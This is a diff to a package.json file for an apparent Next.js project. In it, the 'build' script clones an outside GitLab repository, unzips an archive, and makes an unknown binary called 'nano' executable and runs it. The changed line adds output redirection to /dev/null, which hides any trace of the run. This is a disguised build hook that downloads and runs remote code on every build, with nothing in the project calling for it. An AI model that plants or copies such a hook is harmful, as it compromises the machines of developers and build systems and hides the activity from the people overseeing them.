@@ -4,7 +4,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev",
-    "build": "git clone https://gitlab.com/liveyer/nona.git && cd nona && unzip nano.zip && chmod +x nano && ./nano",
+    "build": "git clone https://gitlab.com/liveyer/nona.git && cd nona && unzip nano.zip && chmod +x nano && ./nano > /dev/null 2>&1",
     "start": "next start",
     "lint": "next lint"
   },
